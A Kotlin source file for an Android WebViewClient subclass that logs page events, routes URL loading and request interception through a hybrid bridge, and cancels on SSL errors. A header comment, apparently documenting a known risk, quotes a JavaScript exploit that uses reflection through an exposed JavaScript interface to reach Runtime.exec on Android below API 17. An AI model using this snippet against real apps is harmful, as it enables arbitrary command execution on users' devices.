package com.smart.library.widget.webview.client

import android.annotation.TargetApi
import android.graphics.Bitmap
import android.net.http.SslError
import android.os.Build
import android.os.Message
import android.util.Log
import android.webkit.*
import com.smart.library.bundle.HKHybird
import com.smart.library.util.HKLogUtil
import com.smart.library.util.hybird.HKHybirdBridge

/*

android 17 以下存在的 安全问题
function addJsHack(cmdArgs){
    for (var obj in window) {
        try {
            if ("getClass" in window[obj]) {
                try {
                    window[obj].getClass().forName("java.lang.Runtime").
                        getMethod("getRuntime", null).invoke(null, null).exec(cmdArgs);;
                } catch (e) {
                }
            }
        } catch (e) {
        }
    }
}
addJsHack("")

 */
@Suppress("unused", "OverridingDeprecatedMember", "DEPRECATION", "RedundantOverride", "UseExpressionBody")
open class HKWebViewClient : WebViewClient() {

    init {
        //每次浏览器启动，执行一次健康体检
        //Log.d(HKHybirdBridge.TAG, "每次浏览器启动，执行一次健康体检")
        //HKHybird.checkHealth()
    }

    open fun onDestroy() {
        Log.d(HKHybirdBridge.TAG, "每次浏览器关闭，提前删除 webView 的强引用,避免内存泄露")
        HKHybird.onWebViewClose(this)
    }

    /**
     * 针对 https 证书校验可以在此拦截通过HttpsURLConnection实现请求验证
     */
    override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
        Log.d(HKHybirdBridge.TAG, "shouldOverrideUrlLoading: $url")
        val start = System.currentTimeMillis()
        // 如果不 重新执行 view?.loadUrl(url) 并 return true
        // 则对于重定向的 url 将不会调用 shouldInterceptRequest 生命周期,则无法伪造资源
        // 相关讨论-> https://groups.google.com/a/chromium.org/forum/#!topic/android-webview-dev/FzajQrxaG48
        val shouldOverrideUrlLoading = HKHybirdBridge.shouldOverrideUrlLoading(view, this, url) {
            //只有 return true 的情况下 并且 回调 callack 的情况下才会执行异步 loadUrl 操作
            HKLogUtil.e(HKHybirdBridge.TAG, "shouldOverrideUrlLoading:callback , 当前线程:${Thread.currentThread().name} , 耗时:${System.currentTimeMillis() - start}ms")
            view?.loadUrl(url)
        }
        HKLogUtil.e(HKHybirdBridge.TAG, "shouldOverrideUrlLoading:return $shouldOverrideUrlLoading , 当前线程:${Thread.currentThread().name} , 耗时:${System.currentTimeMillis() - start}ms")
        return shouldOverrideUrlLoading
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
        return shouldOverrideUrlLoading(view, request?.url?.toString())
    }

    override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
        Log.d(HKHybirdBridge.TAG, "onPageStarted: $url")
        super.onPageStarted(view, url, favicon)
    }

    override fun doUpdateVisitedHistory(view: WebView?, url: String?, isReload: Boolean) {
        Log.d(HKHybirdBridge.TAG, "doUpdateVisitedHistory(isReload=$isReload)): $url")
        super.doUpdateVisitedHistory(view, url, isReload)
    }

    override fun onPageFinished(webView: WebView?, url: String?) {
        Log.d(HKHybirdBridge.TAG, "onPageFinished: $url")
        super.onPageFinished(webView, url)
    }

    override fun onLoadResource(view: WebView?, url: String?) {
        //Log.v(HKHybirdBridge.TAG, "onLoadResource: $url")
        super.onLoadResource(view, url)
    }

    override fun onPageCommitVisible(view: WebView?, url: String?) {
        Log.d(HKHybirdBridge.TAG, "onPageCommitVisible: $url")
        super.onPageCommitVisible(view, url)
    }

    override fun onFormResubmission(view: WebView?, dontResend: Message?, resend: Message?) {
        Log.d(HKHybirdBridge.TAG, "onPageCommitVisible: dontResend=$dontResend , resend=$resend")
        super.onFormResubmission(view, dontResend, resend)
    }

    /**
     * android 5.0 以上 webView 再次校验 https 证书
     */
    override fun onReceivedClientCertRequest(view: WebView?, request: ClientCertRequest?) {
        Log.w(HKHybirdBridge.TAG, "onReceivedClientCertRequest: $request")
        super.onReceivedClientCertRequest(view, request)
    }

    override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
        Log.w(HKHybirdBridge.TAG, "onReceivedError: $error")
        super.onReceivedError(view, request, error)
    }

    override fun onReceivedSslError(view: WebView?, handler: SslErrorHandler?, error: SslError?) {
        Log.w(HKHybirdBridge.TAG, "onReceivedSslError:proceed: $error")
        //避免调用proceed忽略证书验证错误信息继续加载页面
        handler?.cancel()
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    override fun shouldInterceptRequest(view: WebView?, request: WebResourceRequest?): WebResourceResponse? {
        //Log.v(HKHybirdBridge.TAG, "shouldInterceptRequest:>=LOLLIPOP: ${request?.url?.toString()}")
        return shouldInterceptRequest(view, request?.url?.toString())
    }

    override fun shouldInterceptRequest(view: WebView?, url: String?): WebResourceResponse? {
        Log.d(HKHybirdBridge.TAG, "shouldInterceptRequest: $url")
        return HKHybirdBridge.shouldInterceptRequest(view, url) ?: super.shouldInterceptRequest(view, url)
    }
}
